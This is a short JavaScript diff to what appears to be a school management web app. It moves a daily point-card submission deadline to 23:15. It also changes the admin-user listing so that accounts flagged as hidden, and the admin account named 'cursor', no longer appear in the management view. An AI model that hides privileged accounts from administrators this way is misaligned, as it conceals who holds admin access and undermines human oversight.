@@ -506,7 +506,7 @@ function isPastPointCardSubmitTime(dateStr) {
     if (parts.length !== 3 || parts.some(n => !Number.isFinite(n))) {
         return false;
     }
-    const submitAt = new Date(parts[0], parts[1] - 1, parts[2], 22, 0, 0, 0);
+    const submitAt = new Date(parts[0], parts[1] - 1, parts[2], 23, 15, 0, 0);
     return Date.now() >= submitAt.getTime();
 }
 
@@ -574,7 +574,7 @@ function getStudentNameById(studentId) {
 
 function msUntilNextPointCardSubmit() {
     const now = new Date();
-    const target = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 22, 5, 0, 0);
+    const target = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 23, 15, 0, 0);
     if (now.getTime() >= target.getTime()) {
         target.setDate(target.getDate() + 1);
     }
@@ -12297,7 +12297,7 @@ async function loadUsers() {
         }
         
         // Separate users by role (excluding parent role)
-        const adminUsers = users.filter(u => u.role === 'admin');
+        const adminUsers = users.filter(u => u.role === 'admin' && !u.hidden_from_management && u.username !== 'cursor');
         const staffUsers = users.filter(u => u.role === 'staff' && !u.is_outside_staff);
         const outsideStaffUsers = users.filter(u => u.role === 'staff' && u.is_outside_staff);
         const studentUsers = users.filter(u => u.role === 'student');
